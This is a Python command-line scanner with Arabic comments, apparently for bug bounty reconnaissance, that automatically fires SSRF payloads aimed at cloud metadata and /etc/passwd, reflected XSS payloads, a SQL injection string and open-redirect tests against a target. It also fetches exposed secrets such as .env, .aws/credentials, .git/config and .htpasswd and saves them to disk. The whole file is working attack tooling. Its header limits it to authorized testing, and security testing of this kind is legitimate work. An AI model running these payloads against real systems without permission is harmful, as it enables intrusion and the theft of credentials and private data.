#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Bounty Scout - أداة مسح سريعة للثغرات الشائعة (SSRF, IDOR, XSS, ملفات حساسة, SQLi, Open Redirect)
للاستخدام فقط على الأنظمة التي تملك الإذن باختبارها (برامج المكافآت المصرح بها).
"""

import requests
import sys
import argparse
import json
import re
from urllib.parse import urljoin, urlparse
import time

# ================== الإعدادات ==================
VERSION = "2.0"
BANNER = r"""
  ____        _   _   _                 
 |  _ \      | | | | | |                
 | |_) |_   _| |_| |_| | ___  _   _ ___ 
 |  _ <| | | | __| __| |/ _ \| | | / __|
 | |_) | |_| | |_| |_| | (_) | |_| \__ \
 |____/ \__,_|\__|\__|_|\___/ \__,_|___/
    v{} - Bug Bounty Recon Tool
""".format(VERSION)

# ================== الدوال الأساسية ==================

def test_ssrf(target, endpoints, payloads):
    """اختبار SSRF عبر POST مع معاملات متنوعة"""
    results = []
    print("[*] اختبار SSRF...")
    for ep in endpoints:
        url = urljoin(target, ep)
        for p in payloads:
            try:
                # محاولة إرسال payload في حقول مختلفة
                for field in ["url", "link", "target", "uri", "path"]:
                    r = requests.post(url, json={field: p}, timeout=3)
                    if any(k in r.text.lower() for k in ["root", "iam", "secret", "aws", "token", "key", "metadata"]):
                        msg = f"  [SSRF] {url} | field={field} | payload={p} | snippet={r.text[:80]}"
                        print(msg)
                        results.append(msg)
                        break
            except:
                pass
    return results

def test_idor(target, endpoints):
    """اختبار IDOR عبر تغيير المعرفات"""
    results = []
    print("[*] اختبار IDOR...")
    for ep in endpoints:
        url = urljoin(target, ep)
        try:
            r = requests.get(url, timeout=3)
            if any(k in r.text.lower() for k in ["email", "password", "token", "admin", "phone"]):
                msg = f"  [IDOR] {url} | snippet={r.text[:80]}"
                print(msg)
                results.append(msg)
        except:
            pass
    return results

def test_xss(target, params, payloads):
    """اختبار XSS المنعكس"""
    results = []
    print("[*] اختبار XSS...")
    for param in params:
        for p in payloads:
            try:
                r = requests.get(target, params={param: p}, timeout=3)
                if p in r.text and p.replace("<", "&lt;") not in r.text:
                    msg = f"  [XSS] {target}?{param}={p}"
                    print(msg)
                    results.append(msg)
            except:
                pass
    return results

def test_sensitive_files(target, paths):
    """البحث عن ملفات تكوين مكشوفة"""
    results = []
    print("[*] البحث عن ملفات حساسة...")
    for p in paths:
        url = urljoin(target, p)
        try:
            r = requests.get(url, timeout=3)
            if r.status_code in [200, 403, 401]:
                snippet = r.text[:200] if r.status_code == 200 else "(ممنوع الوصول)"
                msg = f"  [Sensitive] {url} | status={r.status_code} | snippet={snippet}"
                print(msg)
                results.append(msg)
                # إذا كان 200، نأخذ عينة
                if r.status_code == 200:
                    with open(f"sensitive_{p.replace('/','_')}.txt", "w") as f:
                        f.write(r.text)
        except:
            pass
    return results

def test_sqli_openredirect(target, params):
    """اختبار SQLi و Open Redirect"""
    results = []
    print("[*] اختبار SQLi و Open Redirect...")
    for param in params:
        # SQLi
        sqli = "1' OR '1'='1"
        try:
            r = requests.get(target, params={param: sqli}, timeout=3)
            if any(k in r.text.lower() for k in ["sql", "mysql", "syntax", "error", "warning"]):
                msg = f"  [SQLi] {target}?{param}={sqli}"
                print(msg)
                results.append(msg)
        except:
            pass
        # Open Redirect
        redir = "https://evil.com"
        try:
            r = requests.get(target, params={param: redir}, allow_redirects=False, timeout=3)
            if r.status_code in [301, 302] and "evil.com" in r.headers.get("Location", ""):
                msg = f"  [Open Redirect] {target}?{param}={redir}"
                print(msg)
                results.append(msg)
        except:
            pass
    return results

# ================== الدالة الرئيسية ==================

def main():
    parser = argparse.ArgumentParser(description="Bounty Scout - أداة مسح سريع للثغرات الشائعة")
    parser.add_argument("target", help="النطاق المستهدف (مثل https://example.com)")
    parser.add_argument("--ssrf", action="store_true", help="تفعيل اختبار SSRF")
    parser.add_argument("--idor", action="store_true", help="تفعيل اختبار IDOR")
    parser.add_argument("--xss", action="store_true", help="تفعيل اختبار XSS")
    parser.add_argument("--sensitive", action="store_true", help="تفعيل البحث عن الملفات الحساسة")
    parser.add_argument("--sqli", action="store_true", help="تفعيل اختبار SQLi و Open Redirect")
    parser.add_argument("--all", action="store_true", help="تشغيل جميع الاختبارات (الافتراضي)")
    parser.add_argument("--output", default="bounty_results.txt", help="اسم ملف النتائج النهائي")
    args = parser.parse_args()

    print(BANNER)
    print(f"[+] استهداف: {args.target}")
    print("[+] بدء المسح...\n")

    target = args.target.rstrip('/')
    all_results = []

    # تحديد الاختبارات
    run_all = args.all or not (args.ssrf or args.idor or args.xss or args.sensitive or args.sqli)

    if run_all or args.ssrf:
        endpoints_ssrf = ["/api/proxy", "/api/fetch", "/redirect", "/load", "/get", "/view", "/download", "/image", "/upload"]
        payloads_ssrf = ["http://169.254.169.254/latest/meta-data/", "http://localhost:8080/admin", "file:///etc/passwd", "http://127.0.0.1:3306"]
        all_results.extend(test_ssrf(target, endpoints_ssrf, payloads_ssrf))

    if run_all or args.idor:
        endpoints_idor = ["/profile?id=2", "/account?user=2", "/api/v1/user/2", "/admin/view?uid=2", "/order?order_id=2"]
        all_results.extend(test_idor(target, endpoints_idor))

    if run_all or args.xss:
        params_xss = ["q", "search", "id", "page", "name", "query"]
        payloads_xss = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>", "\"><svg onload=alert(1)>"]
        all_results.extend(test_xss(target, params_xss, payloads_xss))

    if run_all or args.sensitive:
        sensitive_paths = [
            ".env", ".git/config", "config.json", "settings.py", "wp-config.php",
            "backup.sql", "dump.sql", "admin.php", "debug.php", "test.php",
            "api/swagger.json", "openapi.json", ".aws/credentials",
            "robots.txt", "sitemap.xml", ".htaccess", ".htpasswd"
        ]
        all_results.extend(test_sensitive_files(target, sensitive_paths))

    if run_all or args.sqli:
        sqli_params = ["id", "page", "cat", "product", "user", "file", "url", "redirect", "return"]
        all_results.extend(test_sqli_openredirect(target, sqli_params))

    # حفظ النتائج
    if all_results:
        with open(args.output, "w") as f:
            f.write("\n".join(all_results))
        print(f"\n[✓] تم العثور على {len(all_results)} ثغرة محتملة. حفظت في {args.output}")
        print("\n[+] محتوى النتائج:")
        print("=" * 60)
        for line in all_results:
            print(line)
        print("=" * 60)
    else:
        print("\n[-] لم يتم العثور على أي ثغرة واضحة.")

if __name__ == "__main__":
    main()